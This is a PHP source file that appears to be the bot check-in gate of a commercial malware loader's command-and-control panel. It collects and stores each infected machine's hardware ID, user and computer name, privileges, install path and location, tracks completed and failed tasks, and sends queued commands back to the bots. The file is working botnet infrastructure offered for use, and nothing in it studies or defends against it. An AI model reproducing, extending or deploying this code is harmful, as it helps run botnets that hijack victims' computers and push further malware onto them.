<?php
//error_reporting(E_ALL);
include 'inc/config.php';
include 'inc/geo.php';
include 'inc/rc4.php';

function xss_clean($data)
{
	$data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data);
	$data = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $data);
	$data = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $data);
	$data = html_entity_decode($data, ENT_COMPAT, 'UTF-8');
	$data = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $data);
	$data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data);
	do
	{
		$old_data = $data;
		$data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data);
	}
	while ($old_data !== $data);
	return $data;
}

//Setting Varibals
$ip = $_SERVER['REMOTE_ADDR'];
$country = ip_info($ip, "Country Code");
if ($country == "" || $country == NULL){ $country = "US"; }
$hwid =   xss_clean(md5(base64_decode($_POST['id'])));
$opsys =  xss_clean(base64_decode($_POST['os'])); //Operating Sys
$privs =  xss_clean(base64_decode($_POST['pv'])); //Privlegies (User Context)
$inpat =  xss_clean(base64_decode($_POST['ip'])); //Install Path
$compn =  xss_clean(base64_decode($_POST['cn'])); //Computer Name
$usernm = xss_clean(base64_decode($_POST['un'])); //User Name
$cpuar = xss_clean(base64_decode($_POST['ca'])); //Cpu Architecture

$botyp =  "Loader"; // Bot Type
$botvr =  "Paid Beta"; //Bot Version
$opera = "0";
$taskd = "0";
$unins = "0";
if (isset($_POST['op']))
{
	$opera = $_POST['op'];
}
if (isset($_POST['td']))
{
	$taskd = $_POST['td'];
}
if (isset($_POST['uni']))
{
	$unins = $_POST['uni'];
}
try {
	$exs = $odb->prepare("SELECT COUNT(*) FROM bots WHERE hwid = :h");
	$exs->execute(array(":h" => $hwid));
	if ($exs->fetchColumn(0) == "0")
	{
		$i = $odb->prepare("INSERT INTO bots VALUES(NULL, :hw, :ip, :co, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :td, :os, :ca, :cn, :un, :pv, :bt, :inn, :bv, '1')");
		$i->execute(array(":hw" => $hwid, ":ip" => $ip, ":co" => $country, ":td" => $taskd, ":os" => $opsys, ":ca" => $cpuar, ":cn" => $compn, ":un" => $usernm, ":pv" => $privs, "bt" => $botyp,":inn" => $inpat, ":bv" => $botvr));
	}else{
		$u = $odb->prepare("UPDATE bots SET lastresponce = UNIX_TIMESTAMP(), currenttask = :c, installpath = :os, privileges = :pv WHERE hwid = :h");
		$u->execute(array(":c" => $taskd, ":os" => $inpat, ":pv" => $privs, ":h" => $hwid));
	}
} catch (PDOException $e) {
	echo 'notask'; die();
}catch (Exception $e){
	echo 'notask'; die();
}
if ($opera == "1")
{
	$in = $odb->prepare("INSERT INTO tasks_completed VALUES(NULL, :h, :i)");
	$in->execute(array(":h" => $hwid, ":i" => $taskd));
}
if ($opera == "2")
{
	$in = $odb->prepare("INSERT INTO tasks_failed VALUES(NULL, :h, :i)");
	$in->execute(array(":h" => $hwid, ":i" => $taskd));
}
if ($unins == "1")
{
	$del = $odb->prepare("DELETE FROM bots WHERE hwid = :h LIMIT 1");
	$del->execute(array(":h" => $hwid));
}
$cmds = $odb->query("SELECT * FROM tasks ORDER BY id");

$isTask = false;

while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
{
	if ($com['status'] == "1")
	{
		$executions = $odb->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
		if ($executions == $com['executions'])
		{
			continue;
		}else{
			$ad = $odb->prepare("SELECT COUNT(*) FROM tasks_failed WHERE taskid = :i AND bothwid = :h");
			$ae = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
			$ae->execute(array(":i" => $com['id'], ":h" => $hwid));$ad->execute(array(":i" => $com['id'], ":h" => $hwid));
			if ($ad->fetchColumn(0) == 1)
			{
				continue;
			}
			if ($ae->fetchColumn(0) == 0)
			{
				$isTask = true;
				echo 'newtask`'.$com['id'].'`'.$com['task'].'`'.$com['params'];
				break;
			}
		}
	}
}
if(!$isTask)
{
	echo 'notask';	
}
?>